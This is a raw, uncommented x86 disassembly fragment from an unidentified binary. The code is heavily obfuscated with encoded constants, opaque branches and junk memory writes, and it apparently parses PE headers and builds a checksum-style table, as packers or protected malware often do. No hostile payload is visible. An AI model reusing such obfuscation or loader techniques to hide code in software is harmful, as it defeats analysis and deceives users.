  41bee6:	mov    DWORD PTR [ebp-0x8],eax
  41bee9:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  41bef0:	push   esi
  41bef1:	push   edi
  41bef2:	mov    DWORD PTR [ebp-0x14],0xead718d9
  41bef9:	mov    edi,DWORD PTR [ebp-0x4]
  41befc:	mov    ecx,DWORD PTR [ebp-0x10]
  41beff:	mov    eax,0x7510899
  41bf04:	xor    edi,eax
  41bf06:	mov    edx,0x3272e0
  41bf0b:	xor    ecx,eax
  41bf0d:	add    edi,edx
  41bf0f:	add    ecx,edx
  41bf11:	imul   edi,ecx
  41bf14:	jmp    0x41bf5c
  41bf16:	mov    ecx,DWORD PTR [ebp-0x8]
  41bf19:	mov    esi,DWORD PTR [ebp-0x4]
  41bf1c:	xor    ecx,eax
  41bf1e:	xor    esi,eax
  41bf20:	add    ecx,edx
  41bf22:	add    esi,edx
  41bf24:	test   esi,ecx
  41bf26:	mov    esi,DWORD PTR [ebp-0x8]
  41bf29:	mov    ecx,DWORD PTR [ebp-0x4]
  41bf2c:	je     0x41bf43
  41bf2e:	xor    ecx,eax
  41bf30:	xor    esi,eax
  41bf32:	add    ecx,edx
  41bf34:	add    esi,edx
  41bf36:	shr    esi,cl
  41bf38:	mov    ecx,DWORD PTR [ebp-0x14]
  41bf3b:	xor    ecx,eax
  41bf3d:	add    ecx,edx
  41bf3f:	xor    esi,ecx
  41bf41:	jmp    0x41bf4d
  41bf43:	xor    esi,eax
  41bf45:	xor    ecx,eax
  41bf47:	add    esi,edx
  41bf49:	add    ecx,edx
  41bf4b:	shr    esi,cl
  41bf4d:	mov    DWORD PTR [ebp-0x8],esi
  41bf50:	mov    ecx,DWORD PTR [ebp-0x4]
  41bf53:	xor    ecx,eax
  41bf55:	lea    edi,[edi+ecx*1+0x3272e0]
  41bf5c:	mov    ecx,DWORD PTR [ebp-0xc]
  41bf5f:	mov    esi,DWORD PTR [ebp-0x4]
  41bf62:	xor    esi,eax
  41bf64:	xor    ecx,eax
  41bf66:	sub    ecx,esi
  41bf68:	cmp    edi,ecx
  41bf6a:	jbe    0x41bf16
  41bf6c:	mov    eax,DWORD PTR [ebp-0x8]
  41bf6f:	pop    edi
  41bf70:	mov    DWORD PTR [ebx],eax
  41bf72:	mov    eax,DWORD PTR [ebp-0x8]
  41bf75:	pop    esi
  41bf76:	leave  
  41bf77:	ret    
  41bf78:	push   ebp
  41bf79:	mov    ebp,esp
  41bf7b:	sub    esp,0x420
  41bf81:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  41bf88:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  41bf8f:	mov    DWORD PTR [ebp-0x18],0xf89c86b9
  41bf96:	push   ebx
  41bf97:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41bf9e:	mov    eax,DWORD PTR [ebp-0x14]
  41bfa1:	push   esi
  41bfa2:	mov    esi,0x7510899
  41bfa7:	push   edi
  41bfa8:	xor    eax,esi
  41bfaa:	mov    edi,0x3272e0
  41bfaf:	add    eax,edi
  41bfb1:	mov    DWORD PTR [ebp-0x8],eax
  41bfb4:	mov    DWORD PTR [ebp-0x20],0xf89c85b1
  41bfbb:	mov    DWORD PTR [ebp-0x4],0xead718d9
  41bfc2:	mov    DWORD PTR [ebp-0x10],0x8
  41bfc9:	mov    ecx,ecx
  41bfcb:	mov    eax,DWORD PTR [ebp-0xc]
  41bfce:	mov    ecx,DWORD PTR [ebp-0x14]
  41bfd1:	xor    eax,esi
  41bfd3:	xor    ecx,esi
  41bfd5:	add    eax,edi
  41bfd7:	add    ecx,edi
  41bfd9:	imul   eax,ecx
  41bfdc:	jmp    0x41c00f
  41bfde:	mov    eax,DWORD PTR [ebp-0x4]
  41bfe1:	sub    eax,edi
  41bfe3:	xor    eax,esi
  41bfe5:	mov    DWORD PTR [ebp-0x8],eax
  41bfe8:	lea    ebx,[ebp-0x8]
  41bfeb:	call   0x41bed0
  41bff0:	mov    DWORD PTR [ebp-0x8],eax
  41bff3:	mov    eax,DWORD PTR [ebp-0x8]
  41bff6:	mov    ecx,DWORD PTR [ebp-0x4]
  41bff9:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41c000:	mov    eax,DWORD PTR [ebp-0xc]
  41c003:	mov    ecx,DWORD PTR [ebp-0x4]
  41c006:	xor    eax,esi
  41c008:	lea    eax,[eax+ecx*1+0x3272e0]
  41c00f:	mov    DWORD PTR [ebp-0x4],eax
  41c012:	mov    eax,DWORD PTR [ebp-0x18]
  41c015:	mov    ecx,DWORD PTR [ebp-0xc]
  41c018:	xor    ecx,esi
  41c01a:	xor    eax,esi
  41c01c:	sub    eax,ecx
  41c01e:	mov    ecx,DWORD PTR [ebp-0x4]
  41c021:	cmp    ecx,eax
  41c023:	jbe    0x41bfde
  41c025:	mov    eax,DWORD PTR [ebp-0x1c]
  41c028:	xor    eax,esi
  41c02a:	add    eax,edi
  41c02c:	mov    DWORD PTR [ebp-0x8],eax
  41c02f:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41c036:	mov    ebx,ebx
  41c038:	jmp    0x41c09b
  41c03a:	mov    ecx,DWORD PTR [ebp-0x20]
  41c03d:	mov    eax,DWORD PTR [ebp-0x8]
  41c040:	xor    ecx,esi
  41c042:	add    ecx,edi
  41c044:	shr    eax,cl
  41c046:	mov    DWORD PTR [ebp-0x4],eax
  41c049:	mov    eax,DWORD PTR [ebp+0x8]
  41c04c:	mov    cl,BYTE PTR [eax]
  41c04e:	mov    BYTE PTR [ebp+0xb],cl
  41c051:	mov    cl,BYTE PTR [ebp+0xb]
  41c054:	mov    edx,DWORD PTR [ebp-0x8]
  41c057:	movzx  ecx,cl
  41c05a:	xor    ecx,edx
  41c05c:	mov    DWORD PTR [ebp+0x8],ecx
  41c05f:	mov    ecx,DWORD PTR [ebp-0x18]
  41c062:	mov    edx,DWORD PTR [ebp+0x8]
  41c065:	xor    ecx,esi
  41c067:	add    ecx,edi
  41c069:	and    ecx,edx
  41c06b:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41c072:	mov    edx,DWORD PTR [ebp-0x4]
  41c075:	xor    ecx,edx
  41c077:	mov    DWORD PTR [ebp-0x8],ecx
  41c07a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c07d:	xor    ecx,esi
  41c07f:	lea    eax,[eax+ecx*1+0x3272e0]
  41c086:	mov    DWORD PTR [ebp+0x8],eax
  41c089:	mov    eax,DWORD PTR [ebp-0xc]
  41c08c:	xor    eax,esi
  41c08e:	mov    ecx,0xffcd8d20
  41c093:	sub    ecx,eax
  41c095:	add    ecx,DWORD PTR [ebp-0x10]
  41c098:	mov    DWORD PTR [ebp-0x10],ecx
  41c09b:	mov    eax,DWORD PTR [ebp-0x14]
  41c09e:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0a1:	xor    eax,esi
  41c0a3:	add    eax,edi
  41c0a5:	cmp    ecx,eax
  41c0a7:	jne    0x41c03a
  41c0a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c0ac:	mov    ecx,DWORD PTR [ebp-0x8]
  41c0af:	xor    eax,esi
  41c0b1:	add    eax,edi
  41c0b3:	pop    edi
  41c0b4:	pop    esi
  41c0b5:	xor    eax,ecx
  41c0b7:	pop    ebx
  41c0b8:	leave  
  41c0b9:	ret    0x4
  41c0bc:	push   ebp
  41c0bd:	mov    ebp,esp
  41c0bf:	mov    eax,DWORD PTR [ebp+0x1c]
  41c0c2:	mov    ecx,DWORD PTR [ebp+0x8]
  41c0c5:	mov    edx,DWORD PTR [ebp+0x10]
  41c0c8:	mov    eax,DWORD PTR [eax+0x190]
  41c0ce:	mov    eax,DWORD PTR [eax]
  41c0d0:	sub    esp,0x64
  41c0d3:	push   ebx
  41c0d4:	push   esi
  41c0d5:	push   edi
  41c0d6:	mov    edi,0x7510899
  41c0db:	xor    ecx,edi
  41c0dd:	mov    ebx,0x3272e0
  41c0e2:	add    ecx,ebx
  41c0e4:	cmp    ecx,edx
  41c0e6:	jne    0x41c0f7
  41c0e8:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41c0f2:	jmp    0x41c5f4
  41c0f7:	mov    ecx,DWORD PTR [ebp+0x8]
  41c0fa:	mov    esi,DWORD PTR [ebp+0x14]
  41c0fd:	mov    edx,DWORD PTR [esi]
  41c0ff:	xor    ecx,edi
  41c101:	add    ecx,ebx
  41c103:	cmp    edx,ecx
  41c105:	je     0x41c5af
  41c10b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c10e:	mov    DWORD PTR [ebp-0x1c],eax
  41c111:	mov    DWORD PTR [ebp+0x1c],ecx
  41c114:	mov    ecx,DWORD PTR [ebp+0x18]
  41c117:	mov    eax,DWORD PTR [esi]
  41c119:	mov    DWORD PTR [ebp-0x20],eax
  41c11c:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  41c123:	mov    edx,0xf89c85b8
  41c128:	mov    DWORD PTR [ebp-0x8],edx
  41c12b:	mov    eax,DWORD PTR [ebp+0x1c]
  41c12e:	mov    DWORD PTR [ebp+0x1c],eax
  41c131:	mov    eax,DWORD PTR [ebp+0x1c]
  41c134:	mov    eax,DWORD PTR [eax+0x190]
  41c13a:	mov    eax,DWORD PTR [eax]
  41c13c:	mov    DWORD PTR [ebp-0x24],ecx
  41c13f:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c142:	mov    ecx,DWORD PTR [ecx+0x190]
  41c148:	mov    ecx,DWORD PTR [ecx]
  41c14a:	add    ecx,DWORD PTR [eax+0x3c]
  41c14d:	mov    DWORD PTR [ebp+0x10],ecx
  41c150:	mov    eax,DWORD PTR [ebp+0x8]
  41c153:	xor    eax,edi
  41c155:	add    eax,ebx
  41c157:	mov    DWORD PTR [ebp-0x4],eax
  41c15a:	mov    eax,DWORD PTR [ebp+0x8]
  41c15d:	xor    eax,edi
  41c15f:	add    eax,ebx
  41c161:	mov    DWORD PTR [ebp+0x18],eax
  41c164:	mov    eax,DWORD PTR [ebp+0x10]
  41c167:	mov    eax,DWORD PTR [eax+0x50]
  41c16a:	sub    eax,0xc
  41c16d:	mov    DWORD PTR [ebp-0x28],eax
  41c170:	mov    eax,DWORD PTR [ebp+0x10]
  41c173:	mov    eax,DWORD PTR [eax+0x38]
  41c176:	mov    ecx,DWORD PTR [ebp+0x10]
  41c179:	dec    eax
  41c17a:	test   DWORD PTR [ecx+0x54],eax
  41c17d:	mov    eax,DWORD PTR [ebp+0x10]
  41c180:	je     0x41c19a
  41c182:	mov    eax,DWORD PTR [eax+0x38]
  41c185:	mov    ecx,DWORD PTR [ebp+0x10]
  41c188:	mov    ecx,DWORD PTR [ecx+0x54]
  41c18b:	dec    eax
  41c18c:	not    eax
  41c18e:	and    ecx,eax
  41c190:	mov    eax,DWORD PTR [ebp+0x10]
  41c193:	mov    eax,DWORD PTR [eax+0x38]
  41c196:	add    eax,ecx
  41c198:	jmp    0x41c19d
  41c19a:	mov    eax,DWORD PTR [eax+0x54]
  41c19d:	mov    DWORD PTR [ebp+0x1c],eax
  41c1a0:	mov    eax,DWORD PTR [ebp+0x8]
  41c1a3:	xor    eax,edi
  41c1a5:	add    eax,ebx
  41c1a7:	mov    DWORD PTR [ebp+0x18],eax
  41c1aa:	mov    eax,DWORD PTR [ebp+0x8]
  41c1ad:	xor    eax,edi
  41c1af:	add    eax,ebx
  41c1b1:	mov    DWORD PTR [ebp+0x18],eax
  41c1b4:	mov    eax,DWORD PTR [ebp+0x8]
  41c1b7:	mov    ecx,DWORD PTR [ebp-0x24]
  41c1ba:	xor    eax,edi
  41c1bc:	add    eax,ebx
  41c1be:	mov    DWORD PTR [ecx],eax
  41c1c0:	mov    DWORD PTR [ebp+0x18],edx
  41c1c3:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  41c1ca:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  41c1d1:	mov    DWORD PTR [ebp+0x18],0xf89c85bd
  41c1d8:	mov    eax,DWORD PTR [ebp-0x8]
  41c1db:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c1de:	xor    eax,edi
  41c1e0:	add    eax,ebx
  41c1e2:	imul   eax,ecx
  41c1e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41c1e8:	mov    edx,DWORD PTR [ebp-0x28]
  41c1eb:	xor    ecx,edi
  41c1ed:	lea    ecx,[ecx+edx*1+0x3272e0]
  41c1f4:	cmp    eax,ecx
  41c1f6:	jae    0x41c5a8
  41c1fc:	mov    eax,DWORD PTR [ebp+0x8]
  41c1ff:	xor    eax,edi
  41c201:	add    eax,ebx
  41c203:	mov    DWORD PTR [ebp+0x18],eax
  41c206:	mov    eax,DWORD PTR [ebp+0x1c]
  41c209:	add    eax,DWORD PTR [ebp-0x1c]
  41c20c:	mov    DWORD PTR [ebp-0x4],eax
  41c20f:	push   DWORD PTR [ebp-0x4]
  41c212:	mov    esi,DWORD PTR [ebp-0x1c]
  41c215:	mov    ecx,DWORD PTR [ebp+0x10]
  41c218:	call   0x41b2fe
  41c21d:	mov    DWORD PTR [ebp+0xc],eax
  41c220:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  41c227:	mov    eax,DWORD PTR [ebp-0x18]
  41c22a:	xor    eax,edi
  41c22c:	add    eax,ebx
  41c22e:	push   eax
  41c22f:	lea    eax,[ebp-0x40]
  41c232:	push   eax
  41c233:	call   0x41b909
  41c238:	mov    eax,DWORD PTR [ebp+0xc]
  41c23b:	test   eax,eax
  41c23d:	je     0x41c28d
  41c23f:	mov    eax,DWORD PTR [ebp-0x18]
  41c242:	xor    eax,edi
  41c244:	add    eax,ebx
  41c246:	push   eax
  41c247:	push   DWORD PTR [ebp+0xc]
  41c24a:	lea    eax,[ebp-0x40]
  41c24d:	push   eax
  41c24e:	call   0x41b7b0
  41c253:	mov    eax,DWORD PTR [ebp-0x4]
  41c256:	mov    DWORD PTR [ebp-0x18],eax
  41c259:	mov    eax,DWORD PTR [ebp-0x18]
  41c25c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c25f:	sub    eax,ecx
  41c261:	mov    DWORD PTR [ebp-0x18],eax
  41c264:	mov    eax,DWORD PTR [ebp+0xc]
  41c267:	mov    ecx,DWORD PTR [ebp+0xc]
  41c26a:	mov    eax,DWORD PTR [eax+0x10]
  41c26d:	add    eax,DWORD PTR [ecx+0xc]
  41c270:	mov    ecx,DWORD PTR [ebp-0x18]
  41c273:	cmp    ecx,eax
  41c275:	jb     0x41c28d
  41c277:	mov    eax,DWORD PTR [ebp+0xc]
  41c27a:	mov    eax,DWORD PTR [eax+0xc]
  41c27d:	mov    ecx,DWORD PTR [ebp+0xc]
  41c280:	add    eax,DWORD PTR [ecx+0x8]
  41c283:	mov    ecx,DWORD PTR [ebp-0x18]
  41c286:	sub    eax,ecx
  41c288:	jmp    0x41c57b
  41c28d:	push   0xc
  41c28f:	push   DWORD PTR [ebp-0x4]
  41c292:	lea    eax,[ebp-0x4c]
  41c295:	push   eax
  41c296:	call   0x41b7b0
  41c29b:	mov    eax,0xf89c85b9
  41c2a0:	mov    DWORD PTR [ebp-0x2c],eax
  41c2a3:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  41c2aa:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  41c2b1:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  41c2b8:	lea    ecx,[ebp-0x2c]
  41c2bb:	mov    DWORD PTR [ebp-0xc],ecx
  41c2be:	lea    ecx,[ebp-0x30]
  41c2c1:	mov    DWORD PTR [ebp-0x10],ecx
  41c2c4:	lea    ecx,[ebp-0x34]
  41c2c7:	mov    DWORD PTR [ebp+0xc],ecx
  41c2ca:	lea    ecx,[ebp-0x38]
  41c2cd:	mov    DWORD PTR [ebp-0x14],ecx
  41c2d0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c2d3:	xor    ecx,edi
  41c2d5:	add    ecx,ebx
  41c2d7:	mov    DWORD PTR [ebp-0x18],ecx
  41c2da:	jmp    0x41c4d6
  41c2df:	cmp    eax,0xf89c85bb
  41c2e4:	je     0x41c4e8
  41c2ea:	mov    ecx,DWORD PTR [ebp-0x8]
  41c2ed:	xor    ecx,edi
  41c2ef:	mov    esi,eax
  41c2f1:	add    ecx,ebx
  41c2f3:	mov    DWORD PTR [ebp+0x18],ecx
  41c2f6:	mov    eax,DWORD PTR [ebp-0x18]
  41c2f9:	xor    esi,edi
  41c2fb:	lea    eax,[eax+esi*1+0x3272e0]
  41c302:	mov    DWORD PTR [ebp-0x18],eax
  41c305:	mov    eax,DWORD PTR [ebp-0x8]
  41c308:	mov    ecx,DWORD PTR [ebp-0x18]
  41c30b:	xor    eax,edi
  41c30d:	add    eax,ebx
  41c30f:	cmp    ecx,eax
  41c311:	jne    0x41c326
  41c313:	mov    eax,DWORD PTR [ebp+0x8]
  41c316:	xor    eax,edi
  41c318:	add    eax,ebx
  41c31a:	push   eax
  41c31b:	push   0xc
  41c31d:	lea    eax,[ebp-0x4c]
  41c320:	push   eax
  41c321:	call   0x41bd27
  41c326:	mov    eax,DWORD PTR [ebp-0xc]
  41c329:	mov    eax,DWORD PTR [eax]
  41c32b:	xor    eax,edi
  41c32d:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41c334:	mov    ecx,DWORD PTR [ebp+0x8]
  41c337:	xor    ecx,edi
  41c339:	movzx  eax,al
  41c33c:	add    ecx,ebx
  41c33e:	cmp    eax,ecx
  41c340:	je     0x41c4be
  41c346:	mov    eax,DWORD PTR [ebp-0x10]
  41c349:	mov    eax,DWORD PTR [eax]
  41c34b:	xor    eax,edi
  41c34d:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41c354:	mov    ecx,DWORD PTR [ebp+0x8]
  41c357:	xor    ecx,edi
  41c359:	movzx  eax,al
  41c35c:	add    ecx,ebx
  41c35e:	cmp    eax,ecx
  41c360:	je     0x41c4be
  41c366:	mov    eax,DWORD PTR [ebp+0xc]
  41c369:	mov    eax,DWORD PTR [eax]
  41c36b:	xor    eax,edi
  41c36d:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41c374:	mov    ecx,DWORD PTR [ebp+0x8]
  41c377:	xor    ecx,edi
  41c379:	movzx  eax,al
  41c37c:	add    ecx,ebx
  41c37e:	cmp    eax,ecx
  41c380:	je     0x41c4be
  41c386:	mov    eax,DWORD PTR [ebp-0x14]
  41c389:	mov    eax,DWORD PTR [eax]
  41c38b:	xor    eax,edi
  41c38d:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41c394:	mov    ecx,DWORD PTR [ebp+0x8]
  41c397:	xor    ecx,edi
  41c399:	movzx  eax,al
  41c39c:	add    ecx,ebx
  41c39e:	cmp    eax,ecx
  41c3a0:	je     0x41c4be
  41c3a6:	mov    eax,DWORD PTR [ebp-0x10]
  41c3a9:	mov    eax,DWORD PTR [eax]
  41c3ab:	xor    eax,edi
  41c3ad:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41c3b4:	mov    ecx,DWORD PTR [ebp-0xc]
  41c3b7:	mov    ecx,DWORD PTR [ecx]
  41c3b9:	xor    ecx,edi
  41c3bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41c3c2:	xor    al,cl
  41c3c4:	mov    ecx,DWORD PTR [ebp+0xc]
  41c3c7:	mov    ecx,DWORD PTR [ecx]
  41c3c9:	xor    ecx,edi
  41c3cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41c3d2:	or     al,cl
  41c3d4:	mov    ecx,DWORD PTR [ebp-0xc]
  41c3d7:	mov    ecx,DWORD PTR [ecx]
  41c3d9:	xor    ecx,edi
  41c3db:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41c3e2:	cmp    cl,al
  41c3e4:	jne    0x41c4be
  41c3ea:	mov    eax,DWORD PTR [ebp+0xc]
  41c3ed:	mov    eax,DWORD PTR [eax]
  41c3ef:	xor    eax,edi
  41c3f1:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41c3f8:	mov    ecx,DWORD PTR [ebp-0x10]
  41c3fb:	mov    ecx,DWORD PTR [ecx]
  41c3fd:	xor    ecx,edi
  41c3ff:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41c406:	xor    al,cl
  41c408:	mov    ecx,DWORD PTR [ebp-0x14]
  41c40b:	mov    ecx,DWORD PTR [ecx]
  41c40d:	xor    ecx,edi
  41c40f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41c416:	or     al,cl
  41c418:	mov    ecx,DWORD PTR [ebp-0x10]
  41c41b:	mov    ecx,DWORD PTR [ecx]
  41c41d:	xor    ecx,edi
  41c41f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41c426:	cmp    cl,al
  41c428:	jne    0x41c4be
  41c42e:	mov    eax,DWORD PTR [ebp-0x14]
  41c431:	mov    eax,DWORD PTR [eax]
  41c433:	xor    eax,edi
  41c435:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41c43c:	mov    ecx,DWORD PTR [ebp+0xc]
  41c43f:	mov    ecx,DWORD PTR [ecx]
  41c441:	xor    ecx,edi
  41c443:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41c44a:	xor    al,cl
  41c44c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c44f:	mov    ecx,DWORD PTR [ecx]
  41c451:	xor    ecx,edi
  41c453:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41c45a:	or     al,cl
  41c45c:	mov    ecx,DWORD PTR [ebp+0xc]
  41c45f:	mov    ecx,DWORD PTR [ecx]
  41c461:	xor    ecx,edi
  41c463:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41c46a:	cmp    cl,al
  41c46c:	jne    0x41c4be
  41c46e:	mov    eax,DWORD PTR [ebp-0x14]
  41c471:	mov    eax,DWORD PTR [eax]
  41c473:	xor    eax,edi
  41c475:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41c47c:	mov    ecx,DWORD PTR [ebp-0xc]
  41c47f:	mov    ecx,DWORD PTR [ecx]
  41c481:	xor    ecx,edi
  41c483:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41c48a:	xor    al,cl
  41c48c:	mov    ecx,DWORD PTR [ebp-0x10]
  41c48f:	mov    ecx,DWORD PTR [ecx]
  41c491:	xor    ecx,edi
  41c493:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41c49a:	or     al,cl
  41c49c:	mov    ecx,DWORD PTR [ebp-0x14]
  41c49f:	mov    ecx,DWORD PTR [ecx]
  41c4a1:	xor    ecx,edi
  41c4a3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41c4aa:	cmp    cl,al
  41c4ac:	jne    0x41c4be
  41c4ae:	lea    eax,[ebp-0x4c]
  41c4b1:	push   eax
  41c4b2:	call   0x41bf78
  41c4b7:	mov    ecx,DWORD PTR [ebp-0x44]
  41c4ba:	cmp    eax,ecx
  41c4bc:	je     0x41c4c8
  41c4be:	mov    eax,DWORD PTR [ebp+0x8]
  41c4c1:	xor    eax,edi
  41c4c3:	add    eax,ebx
  41c4c5:	mov    DWORD PTR [ebp+0x18],eax
  41c4c8:	mov    eax,DWORD PTR [ebp-0x8]
  41c4cb:	xor    eax,edi
  41c4cd:	lea    eax,[eax+esi*1+0x3272e0]
  41c4d4:	xor    eax,edi
  41c4d6:	mov    ecx,DWORD PTR [ebp+0x8]
  41c4d9:	mov    edx,DWORD PTR [ebp+0x18]
  41c4dc:	xor    ecx,edi
  41c4de:	add    ecx,ebx
  41c4e0:	cmp    edx,ecx
  41c4e2:	je     0x41c2df
  41c4e8:	mov    eax,DWORD PTR [ebp+0x8]
  41c4eb:	mov    ecx,DWORD PTR [ebp+0x18]
  41c4ee:	xor    eax,edi
  41c4f0:	add    eax,ebx
  41c4f2:	cmp    ecx,eax
  41c4f4:	jne    0x41c507
  41c4f6:	mov    eax,DWORD PTR [ebp-0x8]
  41c4f9:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c4fc:	xor    eax,edi
  41c4fe:	lea    eax,[eax+ecx*1+0x3272e0]
  41c505:	jmp    0x41c57e
  41c507:	push   0x18
  41c509:	push   DWORD PTR [ebp-0x4]
  41c50c:	lea    eax,[ebp-0x64]
  41c50f:	push   eax
  41c510:	call   0x41b7b0
  41c515:	mov    eax,DWORD PTR [ebp+0x8]
  41c518:	mov    ecx,DWORD PTR [ebp-0x18]
  41c51b:	xor    eax,edi
  41c51d:	add    eax,ebx
  41c51f:	cmp    eax,ecx
  41c521:	je     0x41c536
  41c523:	mov    eax,DWORD PTR [ebp+0x8]
  41c526:	xor    eax,edi
  41c528:	add    eax,ebx
  41c52a:	push   eax
  41c52b:	push   0x18
  41c52d:	lea    eax,[ebp-0x64]
  41c530:	push   eax
  41c531:	call   0x41bd27
  41c536:	mov    eax,DWORD PTR [ebp-0x4]
  41c539:	add    eax,0x18
  41c53c:	mov    DWORD PTR [ebp+0x18],eax
  41c53f:	push   DWORD PTR [ebp-0x50]
  41c542:	push   DWORD PTR [ebp+0x18]
  41c545:	mov    eax,DWORD PTR [ebp-0x54]
  41c548:	add    eax,DWORD PTR [ebp-0x20]
  41c54b:	push   eax
  41c54c:	call   0x41b7b0
  41c551:	mov    eax,DWORD PTR [ebp+0x8]
  41c554:	mov    ecx,DWORD PTR [ebp-0x18]
  41c557:	xor    eax,edi
  41c559:	add    eax,ebx
  41c55b:	cmp    eax,ecx
  41c55d:	je     0x41c570
  41c55f:	push   0x0
  41c561:	push   DWORD PTR [ebp-0x50]
  41c564:	mov    eax,DWORD PTR [ebp-0x54]
  41c567:	add    eax,DWORD PTR [ebp-0x20]
  41c56a:	push   eax
  41c56b:	call   0x41bd27
  41c570:	mov    eax,DWORD PTR [ebp-0x24]
  41c573:	mov    ecx,DWORD PTR [ebp-0x50]
  41c576:	add    DWORD PTR [eax],ecx
  41c578:	mov    eax,DWORD PTR [ebp-0x50]
  41c57b:	add    eax,DWORD PTR [ebp+0x1c]
  41c57e:	mov    DWORD PTR [ebp+0x1c],eax
  41c581:	mov    eax,DWORD PTR [ebp-0x8]
  41c584:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c587:	xor    eax,edi
  41c589:	add    eax,ebx
  41c58b:	imul   eax,ecx
  41c58e:	mov    ecx,DWORD PTR [ebp+0x8]
  41c591:	mov    edx,DWORD PTR [ebp-0x28]
  41c594:	xor    ecx,edi
  41c596:	lea    ecx,[ecx+edx*1+0x3272e0]
  41c59d:	cmp    eax,ecx
  41c59f:	jb     0x41c1fc
  41c5a5:	mov    esi,DWORD PTR [ebp+0x14]
  41c5a8:	mov    eax,DWORD PTR [ebp-0x20]
  41c5ab:	mov    DWORD PTR [esi],eax
  41c5ad:	jmp    0x41c5f4
  41c5af:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5b2:	mov    edx,DWORD PTR [ebp+0xc]
  41c5b5:	xor    ecx,edi
  41c5b7:	xor    edx,edi
  41c5b9:	add    ecx,ebx
  41c5bb:	add    edx,ebx
  41c5bd:	cmp    ecx,edx
  41c5bf:	jne    0x41c5d3
  41c5c1:	mov    eax,ds:0x7f642d1e
  41c5c6:	imul   eax,eax,0x9f15fcef
  41c5cc:	mov    ds:0x7f642d1e,eax
  41c5d1:	jmp    0x41c5f4
  41c5d3:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5d6:	xor    ecx,edi
  41c5d8:	add    ecx,ebx
  41c5da:	cmp    eax,ecx
  41c5dc:	je     0x41c5ea
  41c5de:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  41c5e8:	jmp    0x41c5f4
  41c5ea:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  41c5f4:	pop    edi
  41c5f5:	pop    esi
  41c5f6:	pop    ebx
  41c5f7:	leave  
  41c5f8:	ret    0x18
  41c5fb:	push   ebp
  41c5fc:	mov    ebp,esp
  41c5fe:	and    esp,0xfffffff8
  41c601:	mov    eax,DWORD PTR [ebp+0x20]
  41c604:	sub    esp,0x14
  41c607:	push   ebx
  41c608:	mov    ebx,DWORD PTR [ebp+0x14]
  41c60b:	push   esi
  41c60c:	push   edi
  41c60d:	cmp    eax,0xf89c85b9
  41c612:	jne    0x41c61e
  41c614:	push   0xf89c85b8
  41c619:	jmp    0x41c750
  41c61e:	mov    eax,DWORD PTR [ebp+0x20]
  41c621:	cmp    eax,0xf89c85b8
  41c626:	jne    0x41c632
  41c628:	push   0xf89c85bb
  41c62d:	jmp    0x41c750
  41c632:	mov    eax,DWORD PTR [ebp+0x20]
  41c635:	cmp    eax,0xf89c85bb
  41c63a:	jne    0x41c646
  41c63c:	push   0xf89c85ba
  41c641:	jmp    0x41c750
  41c646:	mov    eax,DWORD PTR [ebp+0x20]
  41c649:	cmp    eax,0xf89c85ba
  41c64e:	jne    0x41c65a
  41c650:	push   0xf89c85bd
  41c655:	jmp    0x41c750
  41c65a:	mov    ecx,DWORD PTR [ebp+0x20]
  41c65d:	mov    eax,0xf89c85be
  41c662:	cmp    ecx,eax
  41c664:	jne    0x41c720
  41c66a:	mov    eax,DWORD PTR [ebp+0x10]
  41c66d:	mov    DWORD PTR [esp+0xc],eax
  41c671:	mov    eax,DWORD PTR [ebp+0x18]
  41c674:	mov    DWORD PTR [esp+0x14],eax
  41c678:	mov    eax,DWORD PTR [ebp+0xc]
  41c67b:	mov    DWORD PTR [esp+0x18],eax
  41c67f:	mov    eax,DWORD PTR [ebp+0x8]
  41c682:	mov    DWORD PTR [esp+0x10],eax
  41c686:	mov    eax,DWORD PTR [esp+0x10]
  41c68a:	mov    ecx,DWORD PTR [esp+0x14]
  41c68e:	mov    edi,0x7510899
